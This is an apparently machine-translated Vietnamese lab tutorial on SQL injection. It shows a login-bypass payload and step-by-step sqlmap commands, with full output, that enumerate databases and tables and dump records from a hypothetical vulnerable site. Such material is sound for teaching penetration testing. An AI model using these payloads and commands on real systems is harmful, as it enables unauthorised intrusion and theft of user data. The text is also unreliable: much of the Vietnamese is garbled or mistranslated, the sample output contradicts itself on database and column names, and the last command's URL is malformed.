Lỗ hổng SQL injection là một lỗ hổng phổ biến và từ lâu đã là vấn đề nóng. đây là một chủ đề trong an ninh mạng. Để hiểu được lỗ hổng này, trước tiên chúng ta phải... Tìm hiểu cơ sở dữ liệu là gì và cách các trang web tương tác với cơ sở dữ liệu.

Cơ sở dữ liệu là một tập hợp dữ liệu có thể được lưu trữ, chỉnh sửa và xử lý. đã được truy xuất. Nó lưu trữ dữ liệu từ nhiều ứng dụng theo cấu trúc nhất định. Định dạng này giúp việc lưu trữ, chỉnh sửa và truy xuất trở nên dễ dàng và hiệu quả. Bạn tương tác với nhiều trang web mỗi ngày. Trang web này chứa một số thông tin sau: Các trang web yêu cầu người dùng nhập thông tin. Ví dụ, một trang web có Trang đăng nhập sẽ yêu cầu bạn nhập thông tin đăng nhập, và sau khi bạn nhập Hệ thống sẽ kiểm tra thông tin đăng nhập của bạn xem có chính xác hay không và đăng nhập cho bạn nếu thông tin đó đúng. Vì có rất nhiều người dùng đăng nhập vào trang web đó, vậy trang web đó hoạt động như thế nào? Ghi lại tất cả dữ liệu của người dùng này và xác minh chúng trong quá trình xác thực. Quy trình? Tất cả đều được thực hiện với sự trợ giúp của cơ sở dữ liệu. Các trang web này có các cơ sở dữ liệu lưu trữ thông tin người dùng và các thông tin khác, đồng thời có thể truy xuất chúng. khi cần thiết. Vì vậy, khi bạn nhập thông tin đăng nhập của mình vào trang web. Trên trang này, trang web tương tác với cơ sở dữ liệu của nó để kiểm tra xem những điều này có đúng hay không. Thông tin đăng nhập là chính xác. Tương tự, nếu bạn có một trường nhập liệu để tìm kiếm Ví dụ, một trường nhập liệu trên trang web của một hiệu sách cho phép... Bạn có thể tìm kiếm những cuốn sách đang được bán. Khi bạn tìm kiếm bất kỳ cuốn sách nào, Khi đặt sách, trang web sẽ tương tác với cơ sở dữ liệu để truy xuất thông tin về cuốn sách đó. Hãy tìm cuốn sách đó và trưng bày nó trên trang web.

Giờ đây, chúng ta biết rằng trang web yêu cầu cơ sở dữ liệu truy xuất, lưu trữ, hoặc sửa đổi bất kỳ dữ liệu nào. Vậy, sự tương tác này diễn ra như thế nào? Các cơ sở dữ liệu được quản lý bởi Hệ thống Quản lý Cơ sở dữ liệu (DBMS), chẳng hạn như... MySQL, PostgreSQL, SQLite hoặc Microsoft SQL Máy chủ. Các hệ thống này hiểu Ngôn ngữ truy vấn có cấu trúc ( Vì vậy, bất kỳ ứng dụng hoặc trang web sử dụng các truy vấn SQL khi tương tác với cơ sở dữ liệu. 

Hãy lấy ví dụ về một trang đăng nhập yêu cầu bạn nhập thông tin đăng nhập của mình. Tên người dùng và mật khẩu để đăng nhập. Hãy cung cấp thông tin sau: dữ liệu:

```
Username: John
Password: Un@detectable444
```

Sau khi bạn nhập tên người dùng và mật khẩu, trang web sẽ nhận được... Hãy tạo một truy vấn SQL với thông tin đăng nhập của bạn và gửi nó đến... cơ sở dữ liệu.

 ```
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```
        

Truy vấn này sẽ được thực thi trong cơ sở dữ liệu. Theo truy vấn này, thì Cơ sở dữ liệu sẽ kiểm tra người dùng có tên `John` và mật khẩu của `Un@detectable444` Nếu tìm thấy người dùng như vậy, nó sẽ trả về thông tin của người dùng đó. Thông tin chi tiết cho ứng dụng. Lưu ý rằng truy vấn trên sẽ thành công. chỉ khi người dùng và mật khẩu được cung cấp khớp với nhau trong Cơ sở dữ liệu được phân tách bởi toán tử boolean “AND”.

Đôi khi, khi dữ liệu đầu vào không được xử lý đúng cách, có nghĩa là người dùng Dữ liệu đầu vào không được xác thực, kẻ tấn công có thể thao túng dữ liệu đầu vào và viết câu lệnh SQL. các truy vấn sẽ được thực thi trong cơ sở dữ liệu và thực hiện các hành động mong muốn của kẻ tấn công. Tấn công SQL injection có tác động rất nguy hiểm trong Trong thế giới kỹ thuật số này, tất cả các tổ chức đều lưu trữ dữ liệu của họ, bao gồm Thông tin quan trọng của họ, nằm trong cơ sở dữ liệu, và một câu lệnh SQL thành công. Tấn công chèn mã độc có thể làm tổn hại dữ liệu quan trọng của họ. 

Giả sử trang đăng nhập website mà chúng ta đã thảo luận ở trên thiếu trường nhập liệu. xác thực và làm sạch dữ liệu. Điều này có nghĩa là nó dễ bị tấn công SQL. Tấn công chèn mã. Kẻ tấn công không biết mật khẩu của người dùng John. Chúng sẽ nhập đoạn mã sau vào các ô được cung cấp:
````
Username: John
Password: abc' OR 1=1;-- -
````

Lần này, kẻ tấn công đã nhập một chuỗi ký tự ngẫu nhiên. `abc` và một chuỗi được chèn `' OR 1=1;-- -`. Truy vấn SQL mà trang web sẽ gửi đến Cơ sở dữ liệu giờ đây sẽ có cấu trúc như sau:

 `
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
`
Câu nói này trông tương tự như câu trước. Truy vấn SQL nhưng giờ đã thêm một điều kiện khác với người vận hành `OR` Truy vấn này sẽ kiểm tra xem có hay không. là một người dùng, John. Sau đó, hệ thống sẽ kiểm tra xem John có mật khẩu hay không. `abc` (cái mà Anh ta không thể làm được điều đó vì kẻ tấn công đã nhập mật khẩu ngẫu nhiên). Lý tưởng nhất là truy vấn sẽ thất bại ở đây vì nó yêu cầu cả tên người dùng và Mật khẩu phải chính xác, vì có một `AND` người điều hành ở giữa họ. Nhưng, Truy vấn này có một điều kiện khác, `OR`, giữa mật khẩu và một tuyên bố 1=1Nếu bất kỳ điều nào trong số đó đúng thì toàn bộ câu lệnh SQL sẽ trở nên đúng. Truy vấn thành công. Tuy nhiên, mật khẩu không chính xác, vì vậy hệ thống sẽ kiểm tra mật khẩu tiếp theo. điều kiện, kiểm tra xem `1=1` Như chúng ta đã biết, `1=1` Điều đó luôn đúng, vậy nên Nó sẽ bỏ qua mật khẩu ngẫu nhiên được nhập trước đó và xem xét mật khẩu này. Nếu câu lệnh được coi là đúng, thì truy vấn này sẽ được thực thi thành công. `-- -` ở cuối câu hỏi sẽ bình luận bất cứ điều gì sau đó `1=1` Điều này có nghĩa là truy vấn sẽ được thực thi thành công và kẻ tấn công sẽ đăng nhập được vào tài khoản người dùng của John.

Một trong những điều quan trọng cần lưu ý ở đây là việc sử dụng dấu ngoặc kép đơn. `'` sau đó `abc` Nếu thiếu câu nói này, 'toàn bộ chuỗi `'abc OR 1=1;-- -'` sẽ được coi là mật khẩu, điều này không đúng. Tuy nhiên, nếu chúng ta thêm một dấu ngoặc kép `'` sau đó abcMật khẩu sẽ có dạng như sau: `'abc' OR 1=1;---'`, bao gồm chuỗi gốc "abc" trong truy vấn và cho phép chúng ta đưa ra một điều kiện logic. `OR 1=1` Điều này luôn đúng. 

Thực hiện một Cuộc tấn công chèn mã độc SQL liên quan đến việc phát hiện ra Lỗ hổng tấn công SQL injection vào ứng dụng và thao túng cơ sở dữ liệu. Tuy nhiên, thực hiện tất cả những việc này thủ công có thể tốn thời gian và công sức.

Lưu ý: Trước khi tiếp tục, điều cần thiết là phải lưu ý rằng các lệnh được giải thích trong nhiệm vụ này sẽ không hoạt động bên trong AttackBox vì đây chỉ là một URL giả định dễ bị tấn công để minh họa. Tuy nhiên, nhiệm vụ tiếp theo sẽ cung cấp cho bạn một ví dụ thực tế thông qua một URL dễ bị tấn công để thực hiện cuộc tấn công này.

SQLMap là một công cụ tự động để phát hiện và khai thác SQL Công cụ này giúp phát hiện các lỗ hổng tấn công injection trong ứng dụng web. Nó đơn giản hóa quá trình xác định các lỗ hổng này. Công cụ này được tích hợp sẵn trong một số phần mềm Linux có nhiều bản phân phối, nhưng bạn có thể dễ dàng cài đặt nó nếu không có.

Vì đây là công cụ dòng lệnh, bạn phải mở trình quản lý tệp LINUX OS terminal của mình để sử dụng nó. `--help` Lệnh với SQLMap sẽ liệt kê tất cả các cờ có sẵn mà bạn có thể sử dụng. Nếu bạn không muốn thêm cờ thủ công vào từng lệnh, hãy sử dụng `--wizard` cờ với Khi sử dụng cờ này, công cụ sẽ hướng dẫn bạn từng bước và đặt câu hỏi để hoàn tất quá trình quét, biến nó trở thành lựa chọn hoàn hảo cho người mới bắt đầu. 

```
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u):
```

Cái `--dbs` Cờ này giúp bạn trích xuất tất cả tên cơ sở dữ liệu. Sau khi biết được tên cơ sở dữ liệu, bạn có thể trích xuất thông tin về các bảng của cơ sở dữ liệu đó bằng cách sử dụng... `-D database_name --tables` Các cờ khác nhau trong công cụ SQLMap cho phép bạn trích xuất thông tin chi tiết từ cơ sở dữ liệu. Bây giờ, hãy xem xét một kịch bản thực tế và sử dụng tất cả các cờ trên để khai thác một ứng dụng web dễ bị tấn công SQL injection.

Bước đầu tiên là tìm kiếm URL hoặc yêu cầu có khả năng dễ bị tấn công. Bạn thường có thể bắt gặp một số URL sử dụng tham số GET để truy xuất dữ liệu. Ví dụ, một URL như sau: `http://sqlmaptesting.thm/search?cat=1` sử dụng một tham số `cat` điều đó lấy giá trị `1` Nếu bạn thấy bất kỳ ứng dụng web nào sử dụng tham số GET trong URL để truy xuất dữ liệu, bạn có thể kiểm tra URL đó bằng cờ `-u` trong công cụ SQLMap. Đây được coi là kiểm thử dựa trên HTTP GET. Phương pháp này được áp dụng khi ứng dụng sử dụng tham số GET trong URL để truy xuất dữ liệu từ các tìm kiếm.

Trong thực tế, nhiều ứng dụng web dựa vào cookie để duy trì phiên người dùng, thực thi xác thực hoặc áp dụng kiểm soát truy cập. Khi kiểm thử các ứng dụng như vậy, chỉ cung cấp URL với SQLMap có thể không đủ, vì các yêu cầu chưa được xác thực có thể bị chuyển hướng, bị từ chối hoặc trả về nội dung khác. SQLMap hỗ trợ kiểm thử dựa trên cookie thông qua cờ `--cookie` cho phép bạn bao gồm các cookie phiên (chẳng hạn như...). PHPSESSID, JSESSIONIDBạn có thể truyền trực tiếp mã xác thực (hoặc mã thông báo xác thực) vào yêu cầu của mình. Điều này đảm bảo rằng SQLMap tương tác với ứng dụng trong cùng ngữ cảnh đã được xác thực hoặc ủy quyền như người dùng thông thường. Ví dụ: sau khi đăng nhập vào ứng dụng qua trình duyệt và thu thập cookie phiên, bạn có thể chuyển cookie đó cho SQLMap bằng cách sử dụng `--cookie="SESSIONID=abcdef123456"` Để kiểm tra chính xác các điểm tấn công chỉ có thể truy cập được sau khi xác thực.

Chúng ta sẽ sử dụng một URL trang web được cho là dễ bị tấn công: `http://sqlmaptesting.thm` Để minh họa. Giả sử trang web này có tùy chọn tìm kiếm, và khi bạn nhấp vào tùy chọn tìm kiếm này và tìm kiếm thứ gì đó, URL sẽ trở thành `http://sqlmaptesting.thm/search/cat=1`, sử dụng tham số GET `cat=1` Trong URL để trích xuất thông tin từ cơ sở dữ liệu. Như chúng ta đã biết, các URL có tham số GET có thể dễ bị tấn công SQL injection; hãy quét URL này để xác định xem nó có bất kỳ lỗ hổng SQL injection nào hay không. 

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
      __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
```

Kết quả hiển thị trên cửa sổ terminal phía trên cho thấy các loại khác nhau của Các kiểu tấn công SQL injection, chẳng hạn như tấn công mù dựa trên boolean, dựa trên lỗi, dựa trên thời gian và truy vấn UNION, được xác định trong URL mục tiêu. Đây là những kỹ thuật khác nhau để khai thác lỗ hổng tấn công SQL injection. Ví dụ, trong tấn công blind dựa trên boolean. tiêm SQL, SQL Truy vấn được sửa đổi và một biểu thức boolean (luôn đúng, ví dụ: `1=1` (Đoạn mã) được thêm vào truy vấn để trích xuất thông tin. Trong khi đó, với tấn công SQL injection dựa trên lỗi, một số truy vấn được cố ý sửa đổi để tạo ra lỗi trong kết quả do cơ sở dữ liệu gửi về. Những lỗi này thường chứa thông tin có giá trị về dữ liệu. Tương tự, các kỹ thuật SQL injection khác cũng có thể được sử dụng để khai thác lỗ hổng trong cơ sở dữ liệu.

Kết quả từ lệnh mà chúng ta đã thực thi cho mục tiêu của mình. `http://sqlmaptesting.thm/search/cat=1` cho chúng ta biết rằng các loại khác nhau. Việc tấn công SQL injection là khả thi trên URL này. Chúng ta hãy sử dụng các flag của SQLMap mà chúng ta đã nghiên cứu trước đó để khai thác lỗ hổng này và trích xuất một số dữ liệu có giá trị từ cơ sở dữ liệu.

Để truy xuất cơ sở dữ liệu, chúng ta sử dụng cờ. `--dbs` Hãy thử nghiệm lá cờ này với URL dễ bị tấn công của chúng ta: 

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:49:00] [INFO] resuming back-end DBMS' mysql' 
[08:49:00] [INFO] testing connection to the target URL
[08:49:01] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]    
[08:49:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
```
Sau khi chạy lệnh trên, chúng ta nhận được hai tên cơ sở dữ liệu. Hãy chọn một trong hai. `users` cơ sở dữ liệu và truy xuất các bảng bên trong đó. Chúng ta sẽ định nghĩa cơ sở dữ liệu sau cờ. `-D` và sử dụng `--tables` Thêm cờ ở cuối để trích xuất tất cả tên bảng.

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:50:46] [INFO] resuming back-end DBMS' mysql' 
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+

[text removed]
```
Giờ chúng ta đã có tất cả tên bảng có sẵn trong cơ sở dữ liệu, hãy xuất các bản ghi có trong đó. `thomas` bảng. Để làm được điều đó, chúng ta sẽ định nghĩa cơ sở dữ liệu với `-D` lá cờ, cái bàn với `-T` cờ, và để trích xuất các bản ghi của bảng, chúng ta sẽ sử dụng `--dump` lá cờ. 

```
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+

[text removed]
```
Tuy nhiên, không giống như URL được sử dụng để kiểm thử ở trên, bạn cũng có thể sử dụng kiểm thử dựa trên phương thức POST, trong đó ứng dụng gửi dữ liệu trong phần thân yêu cầu thay vì URL. Ví dụ về điều này có thể là các biểu mẫu đăng nhập, biểu mẫu đăng ký, v.v. Để thực hiện theo cách tiếp cận này, bạn phải chặn một yêu cầu POST trên trang đăng nhập hoặc đăng ký và lưu nó dưới dạng tệp văn bản. Bạn có thể sử dụng lệnh sau để nhập yêu cầu đã lưu trong tệp văn bản đó vào dụng cụ SQLMap:

`user@ubuntu:~$ sqlmap -r intercepted_request.txt`
